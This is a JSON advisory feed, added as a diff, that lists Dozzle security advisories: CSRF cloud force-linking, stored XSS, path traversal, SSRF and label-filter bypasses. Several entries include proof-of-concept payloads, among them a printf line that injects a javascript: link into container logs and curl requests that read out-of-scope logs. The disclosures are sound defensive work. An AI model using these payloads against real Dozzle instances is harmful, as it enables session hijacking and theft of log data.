@@ -1,0 +1,764 @@
+{
+  "schema": "advisorydeck/v1/product-feed",
+  "generated_at": "2026-11-16T09:35:18Z",
+  "product": {
+    "slug": "dozzle",
+    "name": "Dozzle",
+    "category": "monitoring",
+    "homepage": "https://dozzle.dev",
+    "version_scheme": "semver",
+    "branches": []
+  },
+  "advisories": [
+    {
+      "id": "GHSA-7hjf-g4w8-w279",
+      "aliases": [],
+      "title": "Cross-site request forgery on GET /api/cloud/callback force-links a dozzle instance to an attacker's cloud account",
+      "summary": "### Summary\n\n`GET /api/cloud/callback` exchanges a `?token=` query parameter for a dozzle Cloud API key and rewrites the instance-wide cloud-link configuration, and it performs this state change with no CSRF token and no `Origin`/`Sec-Fetch-Site` validation. dozzle's session cookie is `SameSite=Lax`, which browsers attach to cross-site top-level GET navigations, so one visit by any authenticated dozzle user holding the `cloud` role (the default for users.yml users) to an attacker-controlled page links the victim's dozzle instance to the attacker's cloud account. Because cloud-originated log and stats streaming runs with instance-wide container labels rather than the per-user label filters that every other dozzle surface enforces, the attacker's cloud account can then stream all container logs of the victim instance. We verified the full chain on dozzle v11.2.0 (21cc0d70, current release) with a mock cloud endpoint.\r\n\n\n### Details\n\nThe callback handler (`internal/web/cloud.go`, `cloudCallback` writing via `SetCloudConfig` at line 125, route registered in `internal/web/routes.go:402`) performs two state changes from a GET: it calls the configured cloud endpoint (`DOLIGENCE_URL`) to exchange the attacker-supplied token for an API key, and stores `{prefix, linked: true, streamLogs: true}` as the instance cloud configuration. Neither a CSRF token nor an `Origin`/`Sec-Fetch-Site` check gates the request. The advisory GHSA-p66q-2gfp-8v55 (fixed by commit 9c665d42, September 2026) added authentication to this route, so an unauthenticated caller now receives 401, but that is an incomplete fix for the force-link root cause in the authenticated threat model: the cross-site request from a logged-in user carries the session cookie and succeeds.\r\n\r\nThe consequence is not limited to a configuration flag. Cloud-originated assistant turns run as `cloud.APIKeyPrincipal(args.Filter)` (`internal/cloud/client.go:310`, principal constructed with the instance-wide filter at `internal/cli/agent_command.go:232`), and the cloud log streamer lists containers with those instance-global labels (`internal/cloud/log_streamer.go:93`, `ListAllContainers(ls.labels)`). The per-user label filter that dozzle enforces on the UI, streams, downloads, actions and MCP surfaces (the CVE-2026-62286 fix class) is not applied to cloud streaming. A force-linked instance therefore exposes all container logs and stats, and notification dispatch, to the attacker's cloud account.\r\n\r\nData flow: victim user with `cloud` role visits attacker page -> browser sends `GET https://victim.example/api/cloud/callback?token=<attacker-token>` with the SameSite=Lax session cookie -> dozzle exchanges the token at the attacker controlled cloud endpoint -> instance configuration becomes `{\"prefix\":\"att\",\"linked\":true,\"streamLogs\":true}` -> cloud streaming and notifications flow to the attacker's account.\n\n### Proof of concept\n\nPrerequisites: a Linux host with docker, python3 and curl. The archive's deploy script creates an isolated test deployment on 127.0.0.1 (dozzle v11.2.0 with simple auth and two test users, a mock dozzle-cloud endpoint, two labeled test containers; docker resources prefixed `vrdoz`). Credentials are test-only.\r\n\r\nControl cases first (both gates hold in their intended scope):\r\n\r\n```bash\r\n$ POC_HOME=$HOME/dozzle-poc ./deployment/deploy.sh\r\nDEPLOY OK\r\ndozzle: http://127.0.0.1:18082 (vradmin/vradmin-pass-1, vrlimit/vrlimit-pass-1)\r\nmock cloud: http://127.0.0.1:18099 (DOLIGENCE_URL pointed here)\r\ncontainers: vrdoz-a (scope=limited), vrdoz-b (scope=admin)\r\n\r\n$ POC_HOME=$HOME/dozzle-poc ./poc/poc.sh\r\nunauthenticated callback -> HTTP 401 (want 401)\r\nrestricted-user callback -> HTTP 403 (want 403)\r\npre-state : {\"error\":\"no cloud configuration\"} (want {\"error\":\"no cloud configuration\"} / 404)\r\ndrive-by : HTTP/1.1 302 Found (want 302)\r\npost-state: {\"prefix\":\"att\",\"linked\":true,\"streamLogs\":true} (want {\"prefix\":\"att\",\"linked\":true,\"streamLogs\":true})\r\nCONFIRMED - instance force-l...",
+      "published_at": "2026-10-05T16:56:45.000Z",
+      "modified_at": "2026-10-05T16:56:45.000Z",
+      "severity": {
+        "level": "medium",
+        "score": 6.3,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:L/A:N",
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-352"
+      ],
+      "affected": [
+        {
+          "product": "dozzle",
+          "ranges": [
+            {
+              "introduced": "0",
+              "last_affected": "11.2.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/amir20/dozzle/security/advisories/GHSA-7hjf-g4w8-w279",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-7hjf-g4w8-w279",
+          "url": "https://github.com/amir20/dozzle/security/advisories/GHSA-7hjf-g4w8-w279",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:c1c2fe0a20868f02cce9d4caf40c0d3ad7e1c46aa695a8d4e94003da05e24bee",
+      "note": null
+    },
+    {
+      "id": "GHSA-8683-6wwr-q7rq",
+      "aliases": [],
+      "title": "Dozzle: stored HTML injection to XSS in the command palette via container label values, escalated to script execution by a CSP that allows cdn.jsdelivr.net",
+      "summary": "## Summary\r\n\r\nContainer label values reach Dozzle's command palette through `v-html` with no HTML escaping, so anyone who can start a container on a monitored host can store arbitrary HTML that executes in the Dozzle origin of every user who uses the palette; the deployed CSP has no `script-src` and falls back to a `default-src` that allowlists cdn.jsdelivr.net, so an injected same-origin srcdoc iframe loads attacker-chosen remote JavaScript. Reproduced end-to-end on `amir20/dozzle:v11.1.1`: the remote script executed inside the injected iframe (`iframeOriginEq:true`, `jq:true`), while a single-label control stayed inert and inline `onerror=` handlers were CSP-blocked.\r\n\r\n## Details\r\n\r\n**Call chain.**\r\n\r\n1. `assets/models/Container.ts:140-147`: `get namespace()` returns the first non-empty of the label values `dev.dozzle.group`, `coolify.projectName`, `com.docker.stack.namespace`, `com.docker.compose.project`; `assets/stores/swarm.ts:27,57`: `Service` name is the `com.docker.swarm.service.name` label value. Docker does not character-restrict label values.\r\n2. `assets/stores/swarm.ts:12-51` (stacks) and `:53-71` (services) feed `assets/components/search/FuzzySearchModal.vue:300-334`, which pushes `name` into the palette item list.\r\n3. `assets/components/search/FuzzySearchModal.vue:103`: `v-html=\"matchedName(entry.result)\"`; `matchedName` (`:574-591`) concatenates `item.name` slices with `<mark>` wrappers and returns them with no HTML escaping (the no-match branch returns `item.name` raw). Vue `v-html` assigns to `innerHTML` verbatim.\r\n4. Trigger: the victim opens the search/command palette (`assets/layouts/default.vue:46`) and types a matching query, or the poisoned stack/service appears in the empty-query recents row (`FuzzySearchModal.vue:383-391`).\r\n5. CSP escalation (`internal/web/csp.go:11`): the served policy is `default-src 'self' 'wasm-unsafe-eval' blob: https://cdn.jsdelivr.net https://*.duckdb.org; style-src 'self' 'unsafe-inline' blob:; ...` with no `script-src`, so script-src falls back to default-src, which allows `https://cdn.jsdelivr.net` (present only for the duckdb-wasm bundle). Inline `onerror=` handlers are CSP-blocked, and a `<script src>` inserted directly via innerHTML does not execute per the HTML spec - but an injected `<iframe srcdoc=\"...\">` creates a fresh same-origin document that inherits the parent CSP, inside which `<script src=\"https://cdn.jsdelivr.net/npm/<attacker-package>/x.js\">` loads and runs. Allowing an open user-content CDN as a script source is a documented CSP anti-pattern.\r\n\r\n**Contrast with the protected sibling sinks.** The codebase escapes HTML at its other render paths - `internal/web/search/escape.go` escapes server-side (the escape-then-mark order `matchedName` should mirror), `ComplexLogItem` values are server-escaped, `ContainerEventLogItem` uses static strings, and the GHSA-v879-vjhp-gmhc remediation added exactly this kind of sanitization to the log-message sink. `matchedName` is the only container-controlled sink found that feeds `v-html` with no escaping step, so escaping at sinks is clearly the design intent and this path skips it. No overlap with the agent/label-filter advisories (GHSA-m855, GHSA-xcw9, GHSA-r9cj), which concern server-side authorization, and the GHSA-v879-vjhp-gmhc remediation does not touch label metadata or this client palette sink.\r\n\r\n**First bad commit.** Two commits matter. The unescaped sink is as old as the palette component: commit `9447b1e` (2024-06-10, \"feat: display top 10 in fuzzysearch (#3023)\") created `assets/components/FuzzySearchModal.vue` already containing `v-html=\"matchedName(...)\"`. The script-execution escalation requires the CSP change from commit `90b9d9768583b651a74357985e23183f7311342e` (2024-09-19, \"feat: duckdb wasm capibility (#3272)\"), which added `https://cdn.jsdelivr.net` to `default-src` in `internal/web/csp.go` - the later of the two, and therefore the first bad commit for this advisory. `git tag --contains` puts the fi...",
+      "published_at": "2026-10-04T23:58:40.000Z",
+      "modified_at": "2026-10-04T23:58:40.000Z",
+      "severity": {
+        "level": "medium",
+        "score": 6.1,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-79"
+      ],
+      "affected": [
+        {
+          "product": "dozzle",
+          "ranges": []
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/amir20/dozzle/security/advisories/GHSA-8683-6wwr-q7rq",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-8683-6wwr-q7rq",
+          "url": "https://github.com/amir20/dozzle/security/advisories/GHSA-8683-6wwr-q7rq",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:b8dc576aebdcf6f5ef394b0c63b67eeaa1aea7d6e943033d157ea9ad6f6bb586",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-102332",
+      "aliases": [],
+      "title": "Dozzle before 11.1.2 Path Traversal via Log ZIP Download",
+      "summary": "Dozzle versions before 11.1.2 fail to sanitize container display names when building ZIP archive entry names in the log download endpoint. Attackers who can label containers can use path traversal sequences to write files outside the extraction directory when users download and extract logs.",
+      "published_at": "2026-09-28T22:21:39.746Z",
+      "modified_at": "2026-10-01T15:10:08.129Z",
+      "severity": {
+        "level": "medium",
+        "score": 6.1,
+        "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:N/I:H/A:N",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.00324,
+        "percentile": 0.25779,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-22"
+      ],
+      "affected": [
+        {
+          "product": "dozzle",
+          "ranges": [
+            {
+              "introduced": "8.9.1",
+              "fixed": "11.1.2"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/amir20/dozzle/pull/5242",
+          "type": "fix"
+        },
+        {
+          "url": "https://github.com/amir20/dozzle/commit/bc07db73dd84ce2cb939b744e983a8cfdf29c644",
+          "type": "fix"
+        },
+        {
+          "url": "https://github.com/amir20/dozzle/releases/tag/v11.1.2",
+          "type": "release-notes"
+        },
+        {
+          "url": "https://github.com/amir20/dozzle/blob/v11.1.1/internal/web/download.go#L141-L146",
+          "type": "web"
+        },
+        {
+          "url": "https://github.com/amir20/dozzle/blob/v11.1.1/internal/container/docker/client.go#L610-L614",
+          "type": "web"
+        },
+        {
+          "url": "https://github.com/amir20/dozzle",
+          "type": "web"
+        },
+        {
+          "url": "https://www.vulncheck.com/advisories/dozzle-before-11.1.2-path-traversal-via-log-zip-download",
+          "type": "web"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-102332",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-102332",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-102332",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-102332",
+          "license": "FIRST-EPSS"
+        }
+      ],
+      "revision": "sha256:ed2807b5d3b1c10e549e0544d8a2e54777000295feecd599c5ece06ff911de69",
+      "note": null
+    },
+    {
+      "id": "GHSA-v879-vjhp-gmhc",
+      "aliases": [],
+      "title": "Stored XSS in the log viewer: log content can inject URL markers (U+E002/U+E003) to forge javascript: links rendered via v-html",
+      "summary": "## Summary\r\n\r\nBefore rendering container logs, the server escapes the message and then replaces \"URL markers\"\r\nwith an anchor tag. The markers are ordinary Private Use Area characters (`U+E002` / `U+E003`) and\r\nthe replacement copies whatever sits between them directly into `href` **without validating the\r\nscheme**. Any log line can contain those characters, so a container can inject\r\n`\\uE002javascript:alert(document.domain)\\uE003` and have the server emit\r\n`<a href=\"javascript:alert(...)\">`.\r\n\r\nThe front end renders log messages with `v-html`, and `ansi-to-html` is configured with\r\n`escapeXML: false`, so there is no second escaping pass. The result is a stored XSS that executes\r\nin the Dozzle origin when a user clicks the forged link.\r\n\r\n## Details\r\n\r\n**Marker replacement without scheme validation** - `internal/support/web/escape.go:48`:\r\n\r\n```go\r\nfunc escapeAndProcessMarkers(value string) string {\r\n    value = html.EscapeString(value)\r\n    value = urlMarkerRegex.ReplaceAllStringFunc(value, func(match string) string {\r\n        url := strings.TrimSuffix(strings.TrimPrefix(match, URLMarkerStart), URLMarkerEnd)\r\n        href := searchMarkerStripper.Replace(url)\r\n        text := searchMarkerHTMLReplacer.Replace(url)\r\n        return \"<a href=\\\"\" + href + \"\\\" target=\\\"_blank\\\" rel=\\\"noopener noreferrer external\\\">\" + text + \"</a>\"\r\n    })\r\n    ...\r\n}\r\n```\r\n\r\n`html.EscapeString` only escapes quotes and angle brackets; it does not stop a `javascript:` URL.\r\nThe code assumes the markers can only be introduced by `MarkURLs` around http(s) URLs, but the\r\nmarker characters themselves are plain text that any log producer can write:\r\n\r\n```go\r\n// internal/support/web/url.go:10-11\r\nURLMarkerStart = \"\\uE002\"\r\nURLMarkerEnd   = \"\\uE003\"\r\n```\r\n\r\n**Front end renders the result as HTML** - `assets/components/logs/entries/SimpleLogItem.vue:6`:\r\n\r\n```html\r\n<div class=\"log-message ...\" v-html=\"colorize(logEntry.message)\"></div>\r\n```\r\n\r\nand `assets/utils/ansi.ts:7` sets `escapeXML: false`, so the injected markup survives.\r\n\r\n## Proof of Concept\r\n\r\n```bash\r\n# U+E002 = e2 80 82, U+E003 = e2 80 83\r\nprintf '\\xEE\\x80\\x82javascript:alert(document.domain)\\xEE\\x80\\x83\\n' > /proc/1/fd/1\r\n```\r\n\r\n1. The line above is written to the container log (any process able to log, including code paths\r\n   that reflect untrusted input such as user agents or request paths, can produce this).\r\n2. A user opens that container in Dozzle. The streamed message contains:\r\n\r\n```html\r\n<a href=\"javascript:alert(document.domain)\" target=\"_blank\" rel=\"noopener noreferrer external\">javascript:alert(document.domain)</a>\r\n```\r\n\r\n3. The user clicks the link and the script executes in the Dozzle origin.\r\n\r\n## Impact\r\n\r\n- Stored XSS in the Dozzle origin, triggered by viewing/clicking content that a monitored container\r\n  controls. All users viewing that container (including administrators) are affected.\r\n- Script execution in the Dozzle UI can act with the victim session: read data the UI can read and\r\n  call the same APIs the UI calls - including container operations the UI exposes (start/stop,\r\n  shell/exec), which can extend the impact well beyond a simple alert.\r\n- Multi-tenant or shared setups (many containers feeding one Dozzle) make the injection path\r\n  realistic without any privileged position.\r\n\r\n## Suggested Fix\r\n\r\n1. In `escapeAndProcessMarkers`, validate the captured URL before using it as `href`:\r\n   `url.Parse` and require `Scheme` in {`http`, `https`} (reject control characters); otherwise\r\n   render the text without a link.\r\n2. Strip the reserved Private Use Area marker characters (`U+E000`-`U+E003`) from log content before\r\n   serializing it to the client (the project already has similar stripping logic on other paths).\r\n3. Defence in depth on the client: sanitize `v-html` input with a whitelist (e.g. DOMPurify) or\r\n   enable `escapeXML` and re-apply only the intended markup.\r\n\r\n## Disclosure\r\n\r\nReported privately; no public disclosure before a fix and an advisory are pu...",
+      "published_at": "2026-09-14T19:26:07.000Z",
+      "modified_at": "2026-09-14T19:26:07.000Z",
+      "severity": {
+        "level": "medium",
+        "score": 6.1,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-79"
+      ],
+      "affected": [
+        {
+          "product": "dozzle",
+          "ranges": [
+            {
+              "introduced": "0",
+              "last_affected": "11.0.1"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/amir20/dozzle/security/advisories/GHSA-v879-vjhp-gmhc",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-v879-vjhp-gmhc",
+          "url": "https://github.com/amir20/dozzle/security/advisories/GHSA-v879-vjhp-gmhc",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:7278691584c23d4b2e6ff1b33b24d755c88da215a992d7939216c881c5320c22",
+      "note": null
+    },
+    {
+      "id": "GHSA-p66q-2gfp-8v55",
+      "aliases": [],
+      "title": "The /cloud/callback OAuth route is registered outside the RequireAuthentication group",
+      "summary": "## Summary\n\nThe cloud OAuth callback route is registered outside the RequireAuthentication group, so with authentication enabled it is still reachable unauthenticated and can force-link the instance to an attacker cloud account; and the MCP read tools use the server-global label filter instead of the requesting user's filter. Confirmed at HEAD af38e3a.\n\n## D1 (Medium, verified): the callback is outside the auth group\n\ninternal/web/routes.go:\n\n```go\nr.Group(func(r chi.Router) {                    // line 155\n    r.Use(auth.RequireAuthentication)           // line 157\n    ...\n    r.Get(\"/cloud/status\", h.cloudStatus)       // line 213, INSIDE the auth group\n    ...\n})                                              // auth group closes\n...\nr.Get(\"/cloud/callback\", h.cloudCallback)       // line 234, OUTSIDE the auth group\n```\n\nSo even with authentication enabled, /cloud/callback is reachable UNAUTHENTICATED. It processes an attacker-supplied token and calls SetCloudConfig, which persists and broadcasts a cloud API key to all agents. An attacker can force-link the instance to an attacker-controlled cloud account and cause notification and log content to stream to it. Verified empirically with a Go test: the sibling routes /cloud/status, /cloud/config and /api/version all return 401 (negative controls), while /cloud/callback runs the handler (400 without a token, 500 with one). The one assumed link is the full cloud-side exfiltration, not driven against a live cloud backend.\n\n## D2 (Medium, conditional): MCP read tools use the global filter\n\nThe MCP read tools (/api/mcp) use the server-global s.labels instead of the requesting user's filter, so any authenticated user meant to be restricted to a subset of containers can read logs and stats of out-of-scope containers when MCP is enabled. Same class as GHSA-m855 on a newer surface. Read-only and conditional on MCP being enabled.\n\n## Suggested fixes\n\n1. Move /cloud/callback inside the RequireAuthentication group, or add an explicit auth check to the handler.\n2. In the MCP tools, apply the requesting user's filter rather than the server-global labels, matching the normal log and stats paths.\n\nAlso checked and sound: the existing CVEs are patched and correctly scoped (GHSA-m855 agent-label bypass fixed in 9.0.3, GHSA-j643 CSWSH fixed, GHSA-3v9w test-webhook SSRF now behind auth).\n\n## Tooling\n\nI used AI assistance while investigating. D1 was verified with a Go test showing the sibling cloud routes return 401 while /cloud/callback runs the handler, and I confirmed at HEAD that the callback is registered after the RequireAuthentication group closes.\n\nI manually verified this finding against the project's source at the location cited above before reporting it; the AI assistance noted above was for the audit and the drafting.",
+      "published_at": "2026-09-13T13:36:51.000Z",
+      "modified_at": "2026-09-13T13:36:51.000Z",
+      "severity": {
+        "level": "high",
+        "score": 8.2,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N",
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-306",
+        "CWE-863"
+      ],
+      "affected": [
+        {
+          "product": "dozzle",
+          "ranges": [
+            {
+              "introduced": "0",
+              "last_affected": "10.6.11"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/amir20/dozzle/security/advisories/GHSA-p66q-2gfp-8v55",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-p66q-2gfp-8v55",
+          "url": "https://github.com/amir20/dozzle/security/advisories/GHSA-p66q-2gfp-8v55",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:ac70bc27f0befeb50c2128e6a6a1561b51665c930d4618d2a6b58f8de9b19289",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-62286",
+      "aliases": [
+        "GHSA-xcw9-qmmf-vqxj"
+      ],
+      "title": "Dozzle label filters do not restrict container event and statistics streams",
+      "summary": "Dozzle is a realtime log viewer for docker containers. Prior to 10.6.7, streamEvents in internal/web/events.go applies a restricted user's label filter to container lists but not to the container-stat and container-event channels returned by GET /api/events/stream. In a simple-auth deployment using per-user filters, any authenticated restricted account can receive resource telemetry and lifecycle events for containers outside its authorized label scope. The exposed data includes container names, images, full label maps, CPU and memory use, network and disk totals, and deployment or restart activity across monitored hosts, but does not include log contents, environment values, or exec access. This issue is fixed in version 10.6.7.",
+      "published_at": "2026-09-13T13:35:31.000Z",
+      "modified_at": "2026-09-28T14:53:16.185Z",
+      "severity": {
+        "level": "medium",
+        "score": 4.3,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.00425,
+        "percentile": 0.37283,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-200",
+        "CWE-285"
+      ],
+      "affected": [
+        {
+          "product": "dozzle",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "10.6.7"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/amir20/dozzle/security/advisories/GHSA-xcw9-qmmf-vqxj",
+          "type": "advisory"
+        },
+        {
+          "url": "https://github.com/amir20/dozzle/pull/4803",
+          "type": "fix"
+        },
+        {
+          "url": "https://github.com/amir20/dozzle/commit/19c01e0fb491c170796edba3da2692562c204e77",
+          "type": "fix"
+        },
+        {
+          "url": "https://github.com/amir20/dozzle/releases/tag/v10.6.7",
+          "type": "release-notes"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-xcw9-qmmf-vqxj",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-62286",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-62286",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-62286",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-62286",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "ghsa",
+          "id": "GHSA-xcw9-qmmf-vqxj",
+          "url": "https://github.com/amir20/dozzle/security/advisories/GHSA-xcw9-qmmf-vqxj",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:08d9ccd87ece6926ba953351f85ff15ab75e017ec4d52a23bebaf89c603b96fb",
+      "note": null
+    },
+    {
+      "id": "GHSA-r9cj-7m9r-h6hq",
+      "aliases": [],
+      "title": "Container label-filter access-control bypass in POST /api/notifications/preview discloses inventory and real log content of out-of-scope containers to label-restricted users",
+      "summary": "## Summary\nDozzle supports per-user container label filters (users.yaml `filter:` under simple auth, or the `Remote-Filter` header under forward-proxy auth) to restrict which containers a user can see, as documented in the authentication guide (\"Filters are used to restrict the containers that a user can see\"). The notification-rule preview endpoint, `POST /api/notifications/preview`, ignores this filter. It enumerates and reads logs from every container on every host/agent regardless of the requesting user's scope, disclosing both container metadata and real log content to users who are explicitly restricted away from those containers.\n\n## Impact\nAn authenticated low-privilege user whose account is confined by a label filter (e.g. `label=env=dev`) can enumerate the full container inventory across all connected hosts and agents (names, images, labels, group, host) and read up to the last 2 hours of real log lines (up to 10 events per container), plus structured-log field names and total match counts, for containers outside their permitted scope. This breaks the multi-tenant isolation boundary the filter feature is documented to enforce. Logs frequently contain credentials, tokens, and PII, so the confidentiality impact is high. Integrity and availability are unaffected.\n\n## Root cause\nIn `internal/web/notifications.go`, `previewExpression` passes an empty `container.ContainerLabels{}` to the host service instead of the caller's resolved labels:\n- Line 572: `containers, _ := h.hostService.ListAllContainers(container.ContainerLabels{})`\n- Line 595: `containerService, err := h.hostService.FindContainer(c.Host, c.ID, container.ContainerLabels{})`\n\nIn `internal/container/container_store.go`, `ListContainers` (line 153) and `FindContainer` (line 191) only apply the label ACL when `labels.Exists()` is true; with an empty filter, `ListContainers` returns every container and `FindContainer` skips the access check entirely. Every other container-access handler resolves the user's scope via `h.resolveLabels(r)` (`internal/web/logs.go:61`); the preview handler is the sole site hardcoding an empty filter. The route (`internal/web/routes.go:209`) is inside the `RequireAuthentication` group but has no role gate, so any authenticated user reaches it. This is the same class of bug as CVE-2026-24740 (agent exec/attach) but at an independent, unfixed sink.\n\n## Reproduction\nPreconditions: `DOZZLE_AUTH_PROVIDER=simple` (or forward-proxy auth) with at least one label-restricted user. Example users.yaml grants `devuser` the filter `label=env=dev`. Containers exist: `dev-allowed` (env=dev) and `prod-secret` (env=prod). In the UI, devuser sees only env=dev containers.\n\n1. Authenticate as devuser and obtain the JWT (cookie `jwt` or `POST /api/token`).\n2. Enumerate all containers, bypassing the filter:\n   `curl -s http://dozzle:8080/api/notifications/preview -H \"Authorization: Bearer <devuser-JWT>\" -H 'Content-Type: application/json' --data '{\"containerExpression\":\"true\"}'`\n   The response `.matchedContainers` includes `prod-secret` (id, name, image, labels), outside devuser's scope.\n3. Exfiltrate real log content of out-of-scope containers:\n   `curl -s http://dozzle:8080/api/notifications/preview -H \"Authorization: Bearer <devuser-JWT>\" -H 'Content-Type: application/json' --data '{\"containerExpression\":\"name == \"prod-secret\"\",\"logExpression\":\"true\"}'`\n   The response `.matchedLogs[]` contains real prod-secret log lines, `.messageKeys` leaks structured-log field names, and `.totalLogs` leaks the match count.\n\n## Affected versions\nCurrent at time of report (HEAD c2d2623; present in latest release v10.7.4). Affects deployments that use per-user label filters (multi-tenant / restricted accounts) under simple or forward-proxy auth. Single-tenant installs where every user is effectively unrestricted are not impacted.\n\n## CVSS\nCVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N = 6.5 (Medium).\n\n## Remediation\n\nResolve the requesting user's container scope before...",
+      "published_at": "2026-08-26T21:56:21.000Z",
+      "modified_at": "2026-08-26T21:56:21.000Z",
+      "severity": {
+        "level": "medium",
+        "score": null,
+        "vector": null,
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-285",
+        "CWE-639"
+      ],
+      "affected": [
+        {
+          "product": "dozzle",
+          "ranges": [
+            {
+              "introduced": "0",
+              "last_affected": "10.7.4"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/amir20/dozzle/security/advisories/GHSA-r9cj-7m9r-h6hq",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-r9cj-7m9r-h6hq",
+          "url": "https://github.com/amir20/dozzle/security/advisories/GHSA-r9cj-7m9r-h6hq",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:6a95cd2b11538c12ad0a77b6e4a3cd3b3572bcaeac0f5866b22ae6e571119e89",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-73087",
+      "aliases": [
+        "GHSA-p2w3-6x73-2f6x"
+      ],
+      "title": "Dozzle: SSRF guard bypass via IPv6 transition addresses (6to4/NAT64/Teredo) in webhook notification dispatcher",
+      "summary": "Dozzle is a realtime log viewer for docker containers. From 10.5.2 until 10.6.15, the isBlockedIP SSRF guard in internal/notification/dispatcher/webhook.go, used by safeDialContext for webhook notification URLs, does not inspect IPv4 addresses embedded in 6to4, NAT64, Teredo, or IPv4-compatible IPv6 addresses, allowing an authenticated user to reach loopback or link-local targets that the guard intends to block. This issue is fixed in version 10.6.15.",
+      "published_at": "2026-08-04T20:32:40.000Z",
+      "modified_at": "2026-09-08T18:11:57.000Z",
+      "severity": {
+        "level": "low",
+        "score": 2.3,
+        "vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.00465,
+        "percentile": 0.40801,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-918"
+      ],
+      "affected": [
+        {
+          "product": "dozzle",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "10.6.15"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/amir20/dozzle/security/advisories/GHSA-p2w3-6x73-2f6x",
+          "type": "advisory"
+        },
+        {
+          "url": "https://github.com/amir20/dozzle/pull/4887",
+          "type": "fix"
+        },
+        {
+          "url": "https://github.com/amir20/dozzle/commit/8cf7ccd5ee041ecaea92b49951793d4d2393761f",
+          "type": "fix"
+        },
+        {
+          "url": "https://github.com/amir20/dozzle/releases/tag/v10.6.15",
+          "type": "release-notes"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-73087",
+          "type": "web"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-p2w3-6x73-2f6x",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-73087",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-73087",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-73087",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-73087",
+          "license": "FIRST-EPSS"
+        },
+        {
